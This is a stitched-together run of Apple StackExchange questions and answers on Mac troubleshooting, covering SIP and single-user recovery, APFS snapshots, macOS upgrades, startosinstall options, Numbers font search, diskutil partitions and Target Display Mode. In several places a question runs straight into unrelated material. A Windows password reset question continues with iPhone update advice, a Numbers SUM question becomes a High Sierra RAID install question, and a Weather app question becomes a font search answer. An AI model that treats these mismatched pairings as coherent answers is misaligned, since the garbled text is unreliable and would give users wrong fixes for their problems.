it.\nAs we are not able to get to Single User Recovery Mode by using the key sequence, Command + R + S at startup to run csrutil disable, it is not taking you to Single User Mode.\nStart by booting the computer in standard Single User Mode using Command + S.

On reboot hold Command + R, and it will take us to the GUI recovery mode. Once there, click on Utility menu and open Terminal, here we can run the csrutil command:\ncsrutil disable\nTo make the dGPU fix persistent through the next update, make sure to run the nvram command a second time, then reboot by running:\nnvram fa4ce28d-b62f-4c99-9cc3-6815686e30f9:gpu-power-prefs=%01%00%00%00\nfollowed by:\nreboot\nBoot into Single User Mode with Command + S to continue with the kext moving procedure.

I have no issues now.\n\nA: On my Late 2011 MacBook Pro (MacBookPro8,2), I was able to boot into Recovery's Single User Mode on 10.13.6 by continuously holding down Cmd+R at boot and then a few seconds into the grey screen (but before anything else displays) moving directly to Cmd+R+S, not releasing the first two keys when transitioning. Might take a few tries as the timing is inexact.\nTo describe the sequence in more detail, my MBP first boots to a solid-grey screen along with the startup chime. After some amount of time (presumably loading) on this grey screen the FileVault decryption fields appear. Here is generally what it looks like once those fields are on-screen:\n (image sourced from Rich Trouton)\nBefore the fields are on-screen it's exactly the same solid-grey screen but without any other elements on top of it (Apple logo, login items, etc). It takes some time for the completely grey screen to move to what is pictured above. I add S to my key combo between this populated grey screen and the completely solid one. And I noticed that to get it to work consistently I had to add S closer to the appearance of the pictured populated grey screen than to the appearance of the initial solid-grey screen.\nI believe newer MacBooks no longer feature a grey screen when FileVault is enabled and instead opt for a black one which eventually becomes a much more attractive login screen with a wallpaper background image. If I had to guess this approach could still work for these MacBooks but I don't have one nearby to experiment with.\nThe basic generalizable idea is that you hold Cmd+R continuously, press the power button, and then as soon as recovery mode starts you switch to holding Cmd+R+S continuously without releasing the first two keys. The annoying part is that if you switch to the second combination too late then recovery mode stops looking for it and boots into regular recovery. Too early and recovery never boots at all and you go to single user mode on the normal partition. Additionally annoyance is created by the fact that, at least on my MacBook, there is no visual indicator where recovery starts booting and you need to add the S. If recovery's loading bar appears it's already too late to add S.\n\nA: Did you try to boot on a bootable installer of a previous macOS version which supported single-user-recovery?\n\n\n*\n\n*How to create a bootable installer for macOS\nI understand the goal of disabling SIP is to alter /System/. I guess booting in target disk mode and altering /System/ from another Mac bypasses SIP.\n\n\n*\n\n*How to use target disk mode to move files to another computer\n\nA: I am in exactly the same situation for exactly the same reason. My early 2011 MacBook Pro was humming along fine with its dead dGPU until the cursed auto update went to work against my will. \nI can confirm the key combo still worked in 10.13.5 as that’s the last time I did the fix. \nI’m afraid unless somebody finds there’s a new key combo to get into single user recovery this latest update may have nerfed the bad GPU workaround as documented since it’s vital to disable SIP. I have a couple ideas about how to get around this involving having another Mac and external hard drives but I can’t try them until my kids go to sleep for the night. I will update here if I have any success. \n", "Q: How can I create a Windows password reset disk on Mac? I have installed a dual-system on my Mac: Windows and Mac.

However, when attempting to check for software update, I am receiving the following error message:\n\nHow do I overcome this issue and install the software update?\n\nA: This error can occur due to a variety of temporary issues. Make sure you have an active Internet connection. To install the software update, try the following approaches one by one:\nApproach I: Wait for some time and try again\nSoftware update download could fail due to Internet connectivity issues or an issue at the Apple's software update server end. Such issues are often temporary and get resolved automatically in a short while. Tap on Close button in the alert shown and try again after some time. You may also toggle Wi-Fi off and on before re-trying.\n\nApproach II: Update via iTunes\nIf you have a Mac or a PC handy with iTunes installed and an active Internet connection, you can download the software update on the computer and install in on device. Connect your iPhone to the USB port via the Lightning cable and launch iTunes.\nIf this is the first time you are connecting the iPhone to this computer, the computer will ask for your permission to access the iPhone. You'll need to unlock the iPhone and will see and alert asking you to trust the computer.

The keys have been manually swapped to change the layout.\n\nHowever, the layout on your keyboard is QWERTY while Apple support document illustrates AZERTY layout.\nAs mentioned by Tetsujin:\n\nIt looks like some kind of hybrid; it's a French layout but with what looks like a standard UK or International English qwerty inset. The letters match qwerty, including where the azerty layout has to 'move' keys elsewhere\n\nIn order to have output match the keys, you could create a custom layout with Ukelele or Karabiner.\n", "Q: Apple Magic Trackpad - Avoid accidental cursor movement I am in the process of switching from a 13\" MacBook Pro to an iMac which has external Apple wireless keyboard and Trackpad, and I am struggling with the transition due to Trackpad.\nI tried using the Trackpad by placing it physically below the keyboard (like a MacBook Pro) to make it more similar to the MacBook Pro experience, but it didn't help much due to its weight and surface which is double the size of MacBook. I also tried to use it on the right side but I still touch it and move the cursor.\nI need to mention that I do have the Tap-to-Click enabled as I am used to it. I do not like making a physical press to register the click and would like to leave Tap-to-Click enabled.\nIs there something I can do to avoid these very soft accidental touches that ruin my text typing? Like a tool to lower its sensitive area to the centre of the Trackpad and make it insensitive towards its edges.\n\n\nA: I believe a third party app called Better Touch Tool could help you out. It costs around $8, but it does have a 45 day trial.\nI'd say for the most part this app is for customizing gestures or just setting hotkeys and stuff like that, but it has pretty robust settings for alleviating these types of trackpad issues.\nThe trackpad settings can be found from the main window on the top right.

This page - Apple KB: Prepare for APFS in macOS High Sierra - says that APFS supports \"snapshots\" as one of its features.\nCan someone explain how this works? \nI get the basic concept of what snapshots are, but how does APFS actually achieve this? Apple’s page (linked above) doesn’t provide any explanation.\n\nA: What are snapshots\nThe snapshot feature is used to ensure the reliability of your data and to make it possible to roll back the ﬁle system to an earlier point in time. In other words, if you ever need to return your Mac to a previous state, you can simply restore to that relevant snapshot.\nHow do snapshots work?\nAPFS keeps track of snapshots by keeping a single volume checkpoint for each snapshot that’s been created. This is done by ensuring that the contents of any files that are part of a snapshot are protected from deletion. APFS achieves this 'protection' by:\n\n\n*\n\n*ensuring that if/when these files are deleted after a particular snapshot was created, the blocks containing the data from those files are not actually overwritten, even though the meta-data associated with those files is erased from the ﬁle system hierarchy\n\n*continuing to protect this data for as long as that particular snapshot exists\n\n\nHow are snapshots created?\nAssuming you have macOS High Sierra (or above) installed and that your boot volume is formatted as APFS, your Mac will automatically create a snapshot before installing any operating system updates. \nYou can also create snapshots manually as follows:\n\n\n*\n\n*Open the Terminal app (by default it’s located in the Utilities folder within your Applications folder)\n\n*Now copy and paste the following command into Terminal:\ntmutil snapshot\n\n*Press Enter\n\n*A confirmation message will appear within Terminal\nNOTE: At present snapshots older than 24 hours are automatically deleted. As a result, manually creating a snapshot as per the steps above is an excellent strategy when you're about to install any major new software/hardware or if you're about to undertake some testing. Having a snapshot gives you a  \"get out of jail free\" card, albeit only valid for 24hrs!\n\nFor more info on how you can restore from a snapshot, refer to the following:\n\n\n*\n\n*About Time Machine local snapshots \n\n*Restoring from a snapshot with APFS \n", "Q: How to make sure apps remain available after upgrading macOS? I want to upgrade macOS on my father's Mac, as it's quite out of date (currently running Mac OS X 10.6.8). I understand how to back up files before upgrading, but what about apps?  For example, he uses Matlab and would want it to remain available after the upgrade. \nWould that mean reinstalling it after the upgrade (which I suppose might require him to know the product key, which he might not know: he generally doesn't know such things) or is it somehow possible to transfer one's current apps to the post upgrade system without having to reinstall them?  \nHere is the specification of the Mac in question:\nOS: Mac OS X Version 10.6.8\nProcessor: 2.3 GHz Intel Core 15\nMemory: 4GB 1333 MHz DDR3\nModel Name: MacBook Pro\nModel Identifier: MacBookPro8,1\nNo. of processors: 1\nNo. of cores: 2\n\n\nA: Generally, no separate action is required with respect to apps when upgrading macOS. All the installed apps and user data continue to remain available post upgradation.\nHowever, it's important to ensure that the apps are compatible with the upgraded version of macOS before actually performing the upgrade. This information can generally be obtained from the vendor/developer of the app. \nThere may be cases when upgrading macOS will also require you to upgrade the version of the app and associated licensing costs (if any). These all questions could be rightly addressed by the app vendor/developer.\nOn an important note, Apple advises to perform a system backup to guard against rare circumstances, where the upgrade goes wrong.\nIn your specific case, consider checking what's the latest version of OS X/macOS the machine can run. It might not go all the way to macOS High Sierra if it's too old. Obtain that information and plan your app update strategy accordingly.\nAlso, you should consider testing restoring your system from the backup to ensure its trustworthiness. People really don't want a backup - they want to know they can restore and the restore works. The backup is just the preparation to do the restore. You can run an erase/install and just reinstall the current OS to test things without the new OS potentially breaking things. That way you know you can restore the current OS first before you even think of upgrading.\n\n\n*\n\n*How to reinstall macOS\nIt is worth emphasizing the should test since Mac OS X 10.6 Snow Leopard is really a long way back and it's very likely many of the apps will fail on macOS Sierra 10.12 or later and need license keys, upgrades, etc. Having a bootable backup or clone might even be worth the effort. You are about to break lots of things and gambling that they are all minor or not used since tons of functions and features from 10.6 are changed/deprecated/turned-off now. Any one upgrade alone, generally is easier to risk without a test run, but this is decade of neglect in terms of keeping things moving on the routine update/upgrade chain.\n\nA: Here's how I do this. \n\n\n*\n\n*Get a USB drive at least the size of your internal hard drive. \n\n*clone your hard drive onto the USB drive (using whatever method you prefer, I use disk utility), and give the external drive a different name (e.g. MyHD_CLONE).  Again, option-reboot into that hard drive.  Set it as the default boot drive.  Now you have your exact same environment, except it's a clone. Don't save work here.  \n\n*Check that all your applications work. Some may dislike being moved onto a different drive with different serial number and name, and have already failed. You can't test those here unless you have the keys. \n\n*Now install the OS X update on the clone.  Take special care at the drive selection screens not to clobber your internal hard drive, which it may default to.  \n\n*Once the OS X update finishes, go to Apple/App Store and install all relevant updates. Many of your apps will have updates simply because they are on a newer OS  After that finishes, give it one more go-around, as some updates are dependent on other updates. (more on Windows than Mac, but still). \n\n*Now give your applications a thorough test.  \n\n\nIf an application does not work, it's either because of a licensing issue (the DRM didn't like that you updated OS and wants you to authenticate again), some glitch which arose due to accumulated clutter lying around your system, or the app simply can't work on this OS.  A cold-install will distinguish the latter case from the others.\n\nOnce you've \"dialed everything in\" on the test or clone drives, you can install on the main drive with confidence. \n\nA: Will it work, yes, though all the caveats apply. \nI agree, you should have a bootable back up ready and handy,\nespecially since 10.6 is where Carbon apps will start breaking.\nHence why some people sometimes keep a 10.6.8 installation/virtual machine handy.\n10.7 is when they removed that and so -- every app based on that will fail to run.\nIf they were using the more OSX framework, then the will probably run -- maybe, it'd depend on the app...I can't say yes or no...and in some cases, you might just want to upgrade on principle, just to gain any improvements.\n\nA: To answer your question (everyone is asking oneself before an upgrade):\nwhich applications the update to MacOS X will break?\nThere is no professional, nor any easy answer to this question (this isn't typical of MacOS X, it is nearly the same situation on any OS):\n\n\n*\n\n*Apple doesn't provide a database of known incompatabilities,\n\n*most application developpers don't provide a database of known incompatibilities.\nHence it is up to the user to take this risk and test by himself.\nHere is my personnal advice on how to proceed starting from a Mac running\nSnow Leopard.\n\n\n*\n\n*Use an external disk (rather a new one) and make a clone copy of your actual internal disk on it. For this task use Carbon Copy Cloner 3.5.7 (which is the last one compatible with Snow Leopard).\n\n*Download Yosemite combo update.\n\n*Install it on your external disk.\n\n*Boot from your external disk now running Yosemite 10.10.5.\n\n*For each application important for your father to work,\ncheck if it is running correctly\nif it doesn't, find if the application editor provides a compatibility support (as Carbon Copy Cloner does professionnaly) and download the appropriate update. Beware, in some cases this search for the compatible version will be a failure. This is the reason why some editors don't like to advertise this compatibility matrix and let the user discover it on his own. \ncontinue with next application.\nIf you follow this receipe, your original disk is still hosting Snow Leopard. It is a de facto backup you can schwitch back to as quickly as switching the boot disk (~5 minutes).\n\n\n*Run on your external disk hosting Yosemite and\nits set of applications (kept as is or updated or abandonned) for a few days (I advise to check it for a week) with all these applications, to detect all the other possible incompatibilities.\n\n*If the state reached is OK, do the reverse of step 1.: clone your external disk onto your internal one, and switch on it as the boot disk.\n\n", "Q: Opening 'BaseSystem.dmg'? I just had a window pop up telling me it was Opening BaseSystem.dmg, and then disappearing in ~1 second.  All I can find is a reddit thread with preciously few answer.  Anybody with more intel?  I was doing a backup (with Time Machine, an USB connected external drive) when the pop up flickered.\nI am on MacOS 10.13.6 (17G65).\nEDIT: the same dialogue just flashed up (I am doing a backup, with an external HD connected with a USB port).  So likely this popup has something to do with having a drive attached.\n\nA: I have also seen this happen on my system a few times. For me, it happens right when a Time Machine backup finishes (I am also backing up to an external USB HD). I am running macOS Mojave 10.14.3 (18D42).\nIt is very likely that Time Machine creates this file so that it can recover the OS in the case that the backup fails and screws up your system. It probably self-deletes this file if there are no issues at the conclusion of the backup.\nIn case Time Machine is not the only culprit, I recommend searching your system for the source(s) of the file. Open the application \"Terminal\", and run the following command:\nsudo find / -name BaseSystem.dmg -type f 2>/dev/null\nThis will prompt you for your admin password because it will search all files on your system (even those owned by the root user). Depending on how big your hard drive is, this could take a very long time.\nFor me, the only file found was at /Library/Application Support/com.bombich.ccc/Recovery/BaseSystem.dmg. This is a directory used by Bombich Software's Carbon Copy Cloner application. I know this application archives the recovery partition for your OS (so you can reinstall macOS if needed), so I am assuming this DMG file is related to that.\nI haven't tried it, but I assume that if I were to delete this CCC file, it would just get recreated by CCC later. As others have stated, this file does not seem to be malicious or harmful in any way, so keeping it around or deleting it probably doesn't matter too much and is really up to you.\nIf you really want to, you can delete all of these files with the following command:\nsudo find / -name BaseSystem.dmg -type f -delete -print\n\nA: BaseSystem.dmg usually contains a MacOS installer.\nThe dialog you experience has been reported by many after upgrading to 10.13. It seems to be new functionality in 10.13 that is opening these DMGs for some (unknown) reason.\nYou probably want to check if your Time Machine drive or the backup bundle inside it has a BaseSystem.dmg file. MacOS is then automatically opening that file to check for something (unknown purpose).\nIt doesn't appear to be in any way harmful nor malicious.\n\nA: We check the identifier of the volume\ndiskutil list |grep \"Recovery\"\n\n4:                APFS Volume ⁨Recovery⁩                613.8 MB   disk2s3\n\nNow let's make the volume writable\ndiskutil mountDisk  /dev/disk2s3 \n\nThe terminal will now forward us\nopen -R /Volumes/Recovery\n\n", "Q: Multilingual spell checking on Whatsapp Desktop is not working Multilingual spell checking (French and English) is working very well generally on my mac OS install.

Only English spell checking is happening and any word in French (not colluding with an English word of course) is underlined in red.\nIs someone having the same issue? Does anyone have a solution to this?\n\nA: I had the same issue with Spanish and English. I followed these instructions to change the language priority, putting Spanish over English, and the issue was resolved.\nhttp://osxdaily.com/2011/08/21/set-language-priority-mac-os-x-lion-auto-correct/\n\nA: Let me propose a simple workaround that worked perfectly for me.\nIssue: my system language is US English and I want WhatsApp spellchecker in Portuguese.\nI‘ve downloaded from https://github.com/brave/brave-browser/issues/1947 the Portuguese spellcheck dictionary: pt-BR-3-0.bdic.\nIn the folder C:\\Users\\username\\AppData\\Roaming\\WhatsApp\\Dictionaries is located the US English spellcheck dictionary: “en-US-8-0.bdic”.

I followed the instructions at the link shared by Guillermo, making Spanish (for me) the top language and English second, and it helped, but is not 100%.\n\nA: I have the same issue with the WhatsApp desktop app. I am on MacBook Pro last model and OSx Big Sur. My problem is that I write in 5 languages and the above suggested change in priority language would not work for me. I just switched nack to WhatsApp within Safari which works well since it detects automatically any other five languages are use and suggest corrections if necessary. However, I found a separate desktop app more comfortable and would've liked to continue to use it. I tried the new Whats App eta interface but that somehow didn't work for me, can't remember why. But I do remember though is that the language detection in the WA desktop app worked quite okay in the beginning.\n", "Q: Early 2013 Macbook Pro with 4K: Picture quality? This is sort of related to this question. The 13.3 inch Early 2015 Macbook has a resolution of 2560 x 1600. I'm not an expert on displays, I've done a lot of Googling but don't seem to understand.\nHow does my Retina Display with resolution 2560 x 1600 show up on a 4K screen with resolution: 4096 × 2160 in terms of quality of image?

My laptop supports Thunderbolt 2. \n\nA: From Everymac\n\nThis model supports a simultaneous maximum resolution up to 2560x1600 on two external displays via Thunderbolt. Alternately, it can support a single display up to 2560x1600 via Thunderbolt and a single display up to 1920x1200 via HDMI.\n\n2560x1440 native on a 27\" screen is just fine for my old eyes - I've got 2 of them here (screens and eyes ;) so 2560x1600 ought to be OK, assuming it scales down nicely.  \n\"Best\" picture quality would theoretically be a native resolution of that, not scaled - but that wouldn't be future-proof; so you'd have to make that call.\n", "Q: Numbers Sum of all values in a column where another cell within the row matches text I'm sorry if the title is confusing.

I'm wondering if there is a way to install Mac OS High Sierra using terminal onto a specified drive?\nI'm working with a bit of a unique situation as I've been running Mac OS Sierra successfully in a RAID0 setup on a 15\" 2011 MacBook Pro.  I've swapped the SATA-connected optical drive for a second internal SSD for maximum read and write speeds.\nWhen I attempt to go through the installation process for High Sierra, I boot into recovery mode with High Sierra already installed on an external drive and the two freshly erased and partitioned internal SSDs in Mac OS Extended (Journaled) format. I then combine both of the internal drives I wish to use in the RAID0 format with Disk Utility's RAID Assistant. After successfully combining and mounting the drives, I return to the High Sierra Installer to attempt to install the OS on the RAID0 drive.  I'm given the error \"You may not install to this volume because it is part of a AppleRAID.\"\nI've spoken with three Apple Senior Advisers over the phone and via chat who were all very willing to help me but unable to find any solution.\nMy hunch is that because the High Sierra installer automatically converts internal drives during installation into the new APFS, rather than using Mac OS Extended (Journaled) format, it may not be able to do this with a striped RAID virtual drive. I'm able to format both individual SSDs into the APFS format using Disk Utility but when combining the drives using the RAID Assistant the only option is to erase and combine using Mac OS Extended (Journaled).\nI have been able to find some code that forces internal drive installation using the older file system, but you are unable to specify a drive:\n/Applications/Install\\ macOS\\ High\\ Sierra.app/Contents/Resources/startosinstall --converttoapfs NO\n\nI'm willing to attempt to force-install to the mounted RAID drive if there is a way to use terminal to attempt this.\n\nA: This is independent of the RAID problem and may be independent of any APFS problem as well.\nThe core of this question is that the commanline will not allow you to redirect the install away from the booted drive. Therefore this answer covers the question as presented in the question headline.\nThe startosinstall command offers the switch --volume to redirect the installer onto a specified volume.\nTry it:\n..path/to/startosinstall --usage\n\nand find that option missing.\nIt is there for any High Sierra installer. \nBUT\nThis option is only presented when SIP is disabled!\nThe -–volume argument will be hidden, because startosinstall requires – at least – either CSR_ALLOW_UNRESTRICTED_NVRAM/0x40/64 or CSR_ALLOW_ANY_RECOVERY_OS/0x100/256.\nWithout one of these, the --volume argument won’t be supported.\nThat means also that using that switch from the Recovery partition it will be present every time.\nThis trickery is documented at Comparison of startosinstall's available options depending on boot OS environment\nSo in the case of this question:\n/Applications/Install\\ macOS\\ High\\ Sierra.app/Contents/Resources/startosinstall --converttoapfs NO --volume /Volumes/YourChoice\n\n", "Q: What does the 2 temperatures mean in the Weather app?

It most likely came from pasting in styled text and I need a tool or way to track down the offending cells or text. \nHow can I find the text using this specific font?\n\nA: To check which cells have the font family \"TIMES-Roman,\" run the following script. It will generate a dialog that will display the column and row of any cells that contain that font. To run the script:\n\n\n*\n\n*Open your spreadsheet in Numbers and close all other open spreadsheets\n\n*Open Script Editor (/Applications/Utilities/Script Editor.app)\n\n*Switch the language in the top left corner of the window from \"AppleScript\" to \"JavaScript\"\n\n*Paste in the script below and click the button with a \"play\" icon at the top of the window\n\n\nIf you see a blank dialog box, the script couldn't find any cells with the offending font. Please also note that this script assumes that you only have one table and one sheet in your document.\nvar offendingFont = \"TIMES-Roman\"\n\nvar culprits = []\nvar table = Application('Numbers').documents[0].sheets[0].tables[0]\nvar cols = []\nfor (var i = 0; i < table.columnCount(); ++i) cols.push(String.fromCharCode(65 + i))\nvar rows = []\nfor (var i = 0; i < table.rowCount(); ++i) rows.push(i + 1)\nfor (var r of rows) {\n    for (var c of cols) {\n        if (table.cells[c + r].fontName() === offendingFont) culprits.push(c + r)\n    }\n}\n\nvar app = Application.currentApplication()\napp.includeStandardAdditions = true\napp.displayDialog(culprits.join(\", \"))\n\nSince you said you never use any flavor of \"Times\" font, here's an additional, altered version of the script that finds any font with \"times\" anywhere in the name (this might produce better results):\nvar offendingFontExcerpt = \"times\"\n\nvar culprits = []\nvar table = Application('Numbers').documents[0].sheets[0].tables[0]\nvar cols = []\nfor (var i = 0; i < table.columnCount(); ++i) cols.push(String.fromCharCode(65 + i))\nvar rows = []\nfor (var i = 0; i < table.rowCount(); ++i) rows.push(i + 1)\nfor (var r of rows) {\n    for (var c of cols) {\n        if (table.cells[c + r].fontName().toLowerCase().indexOf(offendingFontExcerpt) > -1) culprits.push(c + r)\n    }\n}\n\nvar app = Application.currentApplication()\napp.includeStandardAdditions = true\napp.displayDialog(culprits.join(\", \"))\n\n\nA: Just type Command-T with a cell highlighted. You'll see something like this:\n\n\nA: Yes. With your spreadsheet open there should a separate section on the right of the spreadsheet. At the top of this section, there are 4 labels: Table, Cell, Text, and Arrange. Click on the Text label. The section on the right changes and near the top is a pulldown to select your font. The current font is displayed for anything you have selected in the spreadsheet. The setup is shown below.\n\n\nA: It is not clear what your actual question is.  I will take a different interpretation than the others: I think you want to find the cell that has the unwanted font.\nI am not aware of a way to do that easily in Numbers.  One trick would be to select all cells and change them all to a different font.  But that's no good if you need different fonts to be there.\nHere's something not too bad, though:\n\n\n*\n\n*Open the file with LibreOffice.\n\n*Save it as HTML\n\n*Open the HTML with TextEdit\n\n*Search for \"TIMES\"\n\n\nFor example, I can tell that the only cell set to \"Lucida Grande\" is one that has \"XX\" in it because when I open the HTML in TextEdit, and search for Lucida, the search box says there is only one instance and it highlights the line\n<td height=\"20\" align=\"left\"><font face=\"Lucida Grande\">XX</font></td>\n\nThen I can open the original file in Numbers and go to that cell or us Find to look for the value in that cell, i.e., XX in my example.\n", "Q: Unknown partitions in diskutil When I run the command diskutil list, I get the following output:\n\nI was shocked to see that there was a partition on my internal drive called Linux Filesystem. I would appreciate it if someone could inform me as to what both the Linux Filesystem volume is doing on disk0 and what the VM volume is on disk1. \nFor some clarification: I did used to have a VirtualBox machine on my Mac running Linux but I thought that everything was correctly uninstalled. Therefore, I would like to remove any possible remnants which have persisted.\nEven if these are the result of the VirtualBox, I do not understand how the Linux Filesystem volume has been integrated into disk0; surely it should've been contained by VirtualBox?\n\nA: While it is possible to create a virtual machine that uses a physical partition, this is only done by experienced VirtualBox users. In any case, since you have removed your Linux virtual machine, then you probably do no longer need this partition. If you open a Terminal application window and enter the following commands, this unneeded partition will be removed and the free space added back to macOS.\nsudo diskutil erasevolume free none disk0s3\nsudo diskutil apfs resizecontainer disk0s2 0\n\nThe VM volume on disk1 has nothing to do with VirtualBox. The letters VM stand for virtual memory. This is the swap space used by macOS. The macOS operating system, installed on your Mac, uses 4 different volumes to operate. These volumes are stored in the partition named disk0s2 on your physical drive disk0.  This partition was given the container name disk1. The name disk1 implies a drive, but this is just the naming convension chosen by Apple. So disk1 is not drive, it is a container for the 4 volumes used by macOS.\nAdvice if sudo diskutil apfs resizecontainer disk0s2 0 fails.\nThis would indicate your a problem with the software stored on your drive. You should verify the drive. The Disk Utility with High Sierra no longer allows you to verify your drive. This must be done by entering commands in a Terminal application window. Also, it would be preferable this be done from either macOS Recovery over the Internet or a bootable installer for macOS. The commands shown below can be used to verify the drive. You can determine, if a verify command was successful, by looking for either an OK message or an exit code of 0.\n\nNote: None of these commands will change your drive.\n\ndiskutil verifydisk disk0\ndiskutil verifyvolume disk0s2\ndiskutil unmountdisk disk1\ndiskutil verifyvolume disk1s1\ndiskutil verifyvolume disk1s2\ndiskutil verifyvolume disk1s3\ndiskutil verifyvolume disk1s4\ndiskutil mountdisk disk1\n\nThe purpose of the sudo diskutil apfs resizecontainer disk0s2 0 command is to add back most free space found immediately after the container disk0s2 partition back to the partition.

I have a new macbook pro (2018) and want to connect it to my old iMac 2011 using target display mode. I used to be able to do this just fine with my old MacBook pro (mid 2012) that had a thunderbolt 2 port. \nIn the new set up, I have a thunderbolt 2 cable and an adapter to connect to the new MacBook pro that converts thunderbolt 2 to thunderbolt 3 (USB-C). When i press command + f2 on the iMac, the screen flickers and then just stays black. My MacBook pro recognizes another monitor...so not sure whats happening. \nBoth systems are running the same OS, High Siera, and I have tried changing the adapter to make sure that was not the problem. Any help would be appreciated because I see that some people have managed to get this to work! Are 3rd-party adapters better at getting the job done? \n\nA: I have had the same problem with my 13\" 2018 MBP to my iMac 27-inch, Late 2012.  Talked to Tech support for weeks at the advanced levels.  They told me they are working on it and look for a firmware update for both the laptop and the iMac.  Bought my MBP when they first came out, it is now September 3, 2018 still no update. Still does not work.  Have not heard of anyone finding a work-around.  I used to use target display mode with my MB-air and was looking forward to using it with the new high-powered laptop (it was NO-GO).\n\nA: I FIGURED IT OUT!\nThis was driving me nuts too. 2010 27\" iMac <-> 2018 Macbook Pro using Target Display Mode.\nIf you are using the Apple Thunderbolt 2 -> Thunderbolt 3 adapter, this will not work, because the iMac doesn't use TB2. . . it uses Mini DisplayPort, which has the exact same plug shape as TB2, but is not compatible for this setup. I got a USB-C to Mini DisplayPort Adapter from Amazon for under $20 and it solved the issue. Hallelujah! Hope this works for you too.\n\nA: I have the same issue with my new 2018 I-9 15-inch MBPs (I have two). \nSince around 2012, I have used a variety of 15-inch MBPs with either two 2012 27-inch iMacs or two 2013 27-inch iMacs in target display mode. To be clear, I usually use 2 of the iMacs in target display mode simultaneously, and have never had a problem with any pre 2018 MBP, whether I was using Thunderbolt 2 cables directly plugged into the pre 2016 MBPs or using the Apple Thunderbolt 2/Thunderbolt 3 adapter to plug into the newer ones with the USB-C ports.\nI have an active case with Apple that has been escalated to an engineer with no luck yet with a resolution. I will have to return the 2018 MBPs I purchased if this is not resolved as I need to use 2 monitors simultaneously and do not want to replace the iMacs just because the 2018 MBP can't drive them.\nYou mention some people have been able to get this to work? Can you provide me with details as to how? 3rd party adapters? I would not mind reinvesting in those is that is what is necessary.\n\nA: There is an extensive post on this on the Apple Discussion forums. Someone there recently discovered a workaround by daisy chaining their Thunderbolt connection to the iMac. Somehow going through another device cleared up the signal for them. However most of us don't want to (and shouldn't have to) buy an expensive new hub or drive that can daisy chain so keep reporting this to Apple so they fix this issue! Reference the large thread so hopefully they escalate you to an engineer quickly:\nhttps://discussions.apple.com/thread/8485517\n\nA: The issue is fixed as of Mojave 14.3 (installed on the 2018 MacBook Pro). In fact I believe it should be fixed in 14.1. Note that Mojave 14 does NOT fix this bug - you need to upgrade to at least 14.1. \nSource: Personal experience and https://discussions.apple.com/thread/8495379?page=2\n\nA: I was having this problem with my 15-inch 2018 MBP running 10.14.4 and 27-inch late-2012 iMac running 10.14.5. Doing a whole bunch of stuff on the iMac (resetting SMC, NVRAM, changing brightness levels) didn't fix it. But resetting the SMC on the MBP did fix it for me.\n\nA: Try logging out of the account on the iMac and pressing Command - F2 while at the login screen.\nThis worked consistently for me with a 2019 MacBook Pro on Mojave 10.14.6 and a 2012 iMac on Mojave 10.14.5, with Thunderbolt 3 to Thunderbolt 2 adapter and Thunderbolt cable.\nSuggestion came from a thread on Apple forums\nUpdate: I updated the iMac to Catalina 10.15 and tested it. The behaviour is intermittent, but logging out of the user on the iMac always fixes it for me.\nUpdate2: Also, plug-in the MacBook first and then the iMac.

I'm very used to switching through tabs using the same shortcut as I use in Chrome and textmate, just hitting cmd + number.\nUsually these shortcuts are relative to the tab order. Cmd + 1 is always the first tab, cmd + 2 the second, cmd + 3 the third, etc. For some reason though, recently I've noticed if I open a new tab (e.g 3rd tab) and close the second tab, the shortcut for the 3rd tab remains cmd + 3? \nIt's even weird if I'm on the first tab and open a new tab. It wedges it between the first and last tab (assuming I had 2 open and opened a 3rd), but the shortcut for the new tab is cmd + 3, even though it's in second place?\nIs this new? Can I reset this somehow to be relative to tab order? This is really confusing and unintuitive. \n\nA: The answer to this is really unintuitive...when you don't have this option selected, the tabs show the shortcuts you want \"cmd + number\":\n\nHowever, then you see this annoying issues where the tab shortscuts are based on opening order, even if you rearrange them. After selecting the option to switch tabs, the shortcut shown on each tab is misleading:\n\nBut, it now works with cmd + number in the tab order you see (without needing to use the \"option\" key.\n", "Q: APFS - Is it possible to install 2 macOS versions inside one APFS container? As you might already now, a single APFS container can have multiple APFS partitions inside. Their advantage is the free space is shared between partitions.\nToday I decided to try out macOS Mojave Public Beta and was about to create a second APFS container, but thought \"why not use an APFS partition instead?\" but I didn't want to risk my main macOS High Sierra partition being erased so I decided to ask it here. Is it possible to have multiple macOS installations inside a single container with multiple APFS partitions?\n\nA: Yes, it possible to have multiple macOS installations inside a single container with multiple virtual partitions, but some of the partitions will be shared.\n\nNote: I do not think virtual partitions is the correct terminology. I believe the terminology should be APFS volumes sharing the same APFS partition.\n\nI started  with High Sierra installed to volume labeled Macintosh HD in a APFS container. I using the Disk Utility application to add a new APFS volume labeled Macintosh HD 2. Next, I downloaded High Sierra from the App Store and installed to the Macintosh HD 2 volume. The result from diskutil list is shown below.\n\nNote: I used a external drive, so disk2 appears below instead of the expected disk1.\n\n/dev/disk2 (synthesized):\n   #:                       TYPE NAME                    SIZE       IDENTIFIER\n   0:      APFS Container Scheme -                      +200.0 GB   disk2\n                                 Physical Store disk1s6\n   1:                APFS Volume Macintosh HD            50.8 GB    disk2s1\n   2:                APFS Volume Preboot                 46.1 MB    disk2s2\n   3:                APFS Volume My Recovery             1.0 GB     disk2s3\n   4:                APFS Volume VM                      8.6 GB     disk2s4\n   5:                APFS Volume Machintosh HD 2         18.2 GB    disk2s5\n\nWhile both High Sierra installations use different root volumes (disk2s1 and disk2s5), the installations share disk2s2, disk2s3 and disk2s4. \nNext, I created another APFS volume labeled Mojava 1 and then downloaded Mojava Beta from this Apple website.

In my case, both High Sierra macOS Recoveries are Version 1.0 (327) and the Mojava macOS Recovery is Version 1.0 (330).\nI can boot to one of the three macOS Recoveries stored on disk2s3 by holding down the ⌘+R key combination at startup. If the default startup disk is a APFS volume containing macOS, then the corresponding macOS recovery will startup. For example, if the startup disk is set to the APFS volume Machintosh HD 2, then holding down the ⌘+R key combination at startup will result in the Mac booting to High Sierra macOS Recovery on APFS Volume My Recovery.\n\nNote: macOS Recovery no longer appears in the Mac Startup Manager. However, macOS Recovery, for a given macOS installation, can be booted using the rEFInd Boot Manager.\n\nBTW: Removing Mojave from the APFS container is covering in my answer to the question: Erase an APFS volume?\n", "Q: Can an iOS app be released as a public beta? I'm wondering if there is an equivalent in the iOS App Store to Google Play's beta testing program Early Access.\nhttps://techcrunch.com/2016/09/01/google-plays-beta-testing-program-early-access-opens-to-more-developers/\nhttps://support.google.com/googleplay/answer/7003180?hl=en\nWe are currently testing our app with a handful of users and a few small groups via Testflight, but it's unclear to me if we can scale up the testing without just releasing the app to everyone. \n\nA: To reiterate what I wrote in the comments: Apple does not currently have any \"open beta\" program like Google Play's Early Access. In 